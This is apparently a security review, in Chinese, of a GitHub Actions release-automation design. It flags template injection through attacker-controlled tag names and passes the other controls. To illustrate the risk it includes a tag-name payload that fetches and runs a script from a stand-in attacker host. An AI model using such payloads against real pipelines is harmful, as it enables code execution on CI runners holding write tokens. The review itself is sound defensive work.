# Security Review: FAIL

第 3 轮评审（tag 驱动）。第 1 轮的 4 项阻塞问题在本轮**仍然处于已修复状态**，未被稀释——D13（令牌可见性边界）、D14（构建后端约束）、D8（完整性校验三步断言）、D3（发布文件名白名单）逐条核对无回退。本轮新引入的攻击面里有一项必须先修。

## Blocking Issues

- **tag 名是攻击者可影响的输入，但没有任何约束禁止它以 `${{ }}` 表达式的形式插入 `run:` 脚本体——这是 GitHub Actions 的模板注入（template injection）路径。** 本轮把 tag 名提升为发布链路的核心输入（D2、D6、tasks 6.7），并且 `on.push.tags` 的 glob **放行任意后缀**：`v[0-9]+.[0-9]+.[0-9]+*` 里尾部的 `*` 使 `v1.0.0$(curl -s http://attacker/x | sh)` 这样的 tag 名同样能触发工作流。此时若实现写成 `run: VERSION="${{ github.ref_name }}"`，表达式会在 shell 解析**之前**被 Actions 展开成字面量，攻击载荷直接进入脚本体并在 runner 上执行——在 `release` job 里那是一个持有 `contents: write` 的上下文。design 的 D3 代码片段用的确实是安全形态（`VERSION="${GITHUB_REF_NAME#v}"`，通过环境变量传入、值不会被二次求值），但**这只是示例里恰好写对了，没有任何一条需求或任务把它固定下来**：`release-automation` spec 的「tag 名格式校验」只规定了"用之前要过正则"，而模板注入发生在正则校验**之前**——载荷在展开的那一刻就已执行完了，之后再校验也来不及。tasks 6.7 的措辞"从 `GITHUB_REF_NAME` 去掉 `v` 前缀"暗示了正确做法，但没有禁止错误做法，也没有任何验证任务去检查它。修复方向：在 design 里补一条决策，规定**任何来自 ref、Release 标题、commit 信息等外部可影响来源的值，只能通过 step 级 `env:` 绑定进入 `run:` 脚本，并且在脚本中一律以带引号的变量展开引用；工作流的 `run:` 脚本体内不得出现 `${{ github.ref_name }}` / `${{ github.event.* }}` 一类表达式插值**；在 `release-automation` spec 中把它写成可检查的需求（可靠"读 workflow 文件断言 `run:` 块内不含 `${{ github.* }}`"验证）；tasks 里补上实现约束与一条对应的验证任务。顺带在 spec 中明确：正则校验是**用途闸门**，不是注入防线——两者解决的是不同阶段的问题，不能互相替代。

## Scope Reviewed

- `loopspec/changes/add-release-automation/design.md`（第 3 轮，D1–D17、Risks、Migration Plan、Open Questions）
- `loopspec/changes/add-release-automation/tasks.md`（第 3 轮，9 组 49 个任务；重点是 **[SEC]** 标注的 1.2、1.4、2.1、3.2、3.3、4.1–4.4、5.1、5.3、5.6、5.7、6.1–6.3、6.5–6.9、6.11、6.13、6.14、8.3、9.5–9.8）
- `loopspec/changes/add-release-automation/specs/release-automation/spec.md`（16 条需求）
- `loopspec/changes/add-release-automation/specs/cli-installation/spec.md`（11 条需求）
- `.attempts/round-001/`、`.attempts/round-002/`（对照前两轮，确认第 1 轮的修复成果未被本轮改动稀释）
- 受影响的既有代码：`pyproject.toml`、`src/loopspec/__init__.py`、`Makefile`

## Checks Performed

- **模板注入 / 命令注入（本轮新增面）**：tag 名的用途闸门（正则）齐备，但**缺少插值形态的约束**——见 Blocking Issues。`gh api ... compare/main...$GITHUB_SHA` 用的是环境变量而非表达式插值，这一处是安全的。
- **版本混淆 / 降级攻击（本轮新增面）**：这一项**通过，且是本轮设计的一个亮点**。把一个旧 commit 打成 `v9.9.9` 发成"最新版"这条路被三条约束联合堵死：D15 要求 tag 指向的 commit 可从 `main` 到达；D5 的 `--expect` 要求该 commit 的 `pyproject.toml` 与 `__init__.py` **都等于 tag 版本号**（旧 commit 声明的是它当时的版本，对不上就失败）；D16 要求同名 Release 不存在。三者叠加后，"能推 tag 的人"实际只能发布"main 历史上某个自己声明了该版本号、且尚未发布过的 commit"，无法凭空造出一个高版本号。这个闭环值得在 design 里点明，目前只是各条决策的副产品。
- **新的授权假设（"能推 `v*` tag 即能发布"）**：如实披露在 Risks，并要求写进 README（tasks 8.3，含"这是仓库配置建议而非已实施控制"的限定）。结合上一条的三重约束，实际权限边界是可接受的。通过。
- **凭据处理**：不引入新 secret；顶层 `contents: read`，仅 `release` 提升为 `write`；令牌只以 step 级 `env` 绑定在 `gh` 的三个 step（6.8/6.10/6.13）。D15 特意选 `gh api` 而非 `git fetch`，正是为了不破坏 `persist-credentials: false`——这个连带推理是对的。通过。
- **`checkout` 凭据持久化**：每处均要求 `persist-credentials: false`（tasks 6.2，验证 9.6）。通过。
- **供应链**：两个 action 均 pin 到 40 位 SHA 且附版本注释；发布与可达性校验都用预装 `gh`，不引第三方 action；构建后端加了 `>=1.31,<2`。通过。
- **产物完整性**：三步校验、"没校验到即失败"、禁用 `--ignore-missing`、精确文件名匹配、安装器只接本地已校验路径。本轮新增了 4.3 关于"以临时目录为工作目录执行"的实现约束（上一轮是我作为非阻塞提醒给出的），已吸收。通过。
- **路径穿越**：进入路径拼接的外部值只有版本号，三处来源（tag 名、`LOOPSPEC_VERSION`、API 的 `tag_name`）共用同一条正则；临时目录用 `mktemp -d`。通过。
- **失败方向**：逐条核对新增控制——tag 名非法→失败；tag 不可从 `main` 到达→失败；三方版本号不一致→失败（且在构建之前）；Release 已存在→失败（不再静默跳过）；资产缺失→失败；`gh release view` 查询本身出错→失败。全部 fail-closed，且 D16 明确撤掉了上一轮"跳过算成功"的语义，理由（tag 推送即明确发布意图）站得住。通过。
- **提权与系统写入（客户端）**：禁 `sudo`、禁写系统目录、不自动装 uv/pipx、不回退 `pip --user`。通过。
- **传输中断的部分执行**：`main()` 封装 + 末尾调用。通过。
- **fork PR 执行面**：仍不监听 `pull_request`。通过。

## Recommended Fix Direction

只有一处需要改，范围很小：把"外部可影响的值如何进入 `run:`"从示例里的隐含做法提升为显式约束。具体是 design 加一条决策（与 D13 的令牌可见性边界并列，同属"workflow 编写规约"）、`release-automation` spec 加一条可检查的需求、tasks 加一条实现约束与一条验证任务（例如"grep workflow 文件，确认 `run:` 块内不出现 `${{ github.` 开头的插值"）。spec 里请同时写明**正则校验与插值约束解决的是不同阶段的问题**：前者管"这个值能不能用于拼路径"，后者管"这个值会不会在被检查之前就已经作为代码执行"，不可互相替代。

其余部分不要改动。特别是以下几条在重做时应原样保留：D5 的三方一致性校验（它同时承担了版本混淆防护，不只是"防手滑"）、D15 的可达性校验（否掉它会同时削弱版本混淆防护，请把这个连带影响写进 design 的 D15，供下一轮 approval 判断时参考）、D16 的"已存在则失败"、D8 的三步断言、D13/D14 的令牌与构建后端约束、以及第 6 组里"令牌只绑定在 `gh` step"的写法。

另有两点非阻塞、建议顺手处理（不必为它们再走一轮）：

- tasks 6.8 把可达性校验的 base 硬编码为 `main`。默认分支若被改名，该 step 会失败——方向是关闭的，但报错会指向一个看起来无关的地方。可考虑取 `${{ github.event.repository.default_branch }}` 或 `gh api repos/$GITHUB_REPOSITORY --jq .default_branch`（注意前者是表达式插值，若采用请遵守本轮新增的插值约束，经 `env:` 传入）。
- 可达性校验（6.8）目前在 `release` job，而 `verify` job 在它之前就已经在被打 tag 的 commit 上跑了 `pytest` 与 `uv build`。也就是说，给一个未合入 `main` 的 commit 打 tag，仍能让该 commit 的代码在 CI 中执行一次。影响是有界的（`verify` 无令牌、`contents: read`，且 Actions 的 cache 作用域不允许非默认 ref 的缓存回写到默认分支），所以不阻塞；但如果想更严格，可以把可达性校验前移到 `verify` 的第一个 step。
